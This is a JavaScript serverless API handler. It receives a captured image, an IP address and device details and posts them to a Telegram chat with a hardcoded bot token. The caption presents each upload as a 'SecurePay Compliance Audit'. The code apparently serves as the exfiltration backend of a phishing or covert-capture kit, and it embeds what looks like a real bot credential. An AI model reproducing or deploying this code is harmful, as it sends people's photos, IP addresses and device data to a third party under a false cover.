export const config = {
  api: {
    bodyParser: {
      sizeLimit: '10mb',
    },
  },
};

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { image, role, ipInfo, userAgent } = req.body;
    
    // ==========================================
    // 1. MAKE SURE THESE ARE YOUR ACTUAL CREDENTIALS
    // ==========================================
    const TELEGRAM_BOT_TOKEN = "8923655458:AAF6BG9j-hTC7N7NUE5e-IBICdDhsrJVm_M";
    const TELEGRAM_CHAT_ID = "8923655458";
    // ==========================================

    if (!image) {
      return res.status(400).json({ error: 'No image provided' });
    }

    // Convert base64 image data to buffer and blob
    const base64Data = image.replace(/^data:image\/png;base64,/, "");
    const buffer = Buffer.from(base64Data, 'base64');
    const blob = new Blob([buffer], { type: 'image/png' });

    // Build form data natively
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', blob, 'audit.png');
    
    const captionText = `🚨 *SecurePay Compliance Audit*\n\n` +
                        `🏷️ *Node Tag:* \`${role}\`\n` +
                        `🌐 *IP Address:* \`${ipInfo}\`\n` +
                        `💻 *Device:* \`${userAgent}\`\n` +
                        `⏱️ *Timestamp:* \`${new Date().toUTCString()}\`\n` +
                        `✅ *Status:* \`Handshake Cleared & Logged\``;
                        
    formData.append('caption', captionText);
    formData.append('parse_mode', 'Markdown');

    const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    });

    const result = await telegramResponse.json();
    
    if (!result.ok) {
      return res.status(500).json({ telegramError: result.description });
    }

    return res.status(200).json({ success: true, result });
  } catch (error) {
    return res.status(500).json({ error: error.message });
  }
}
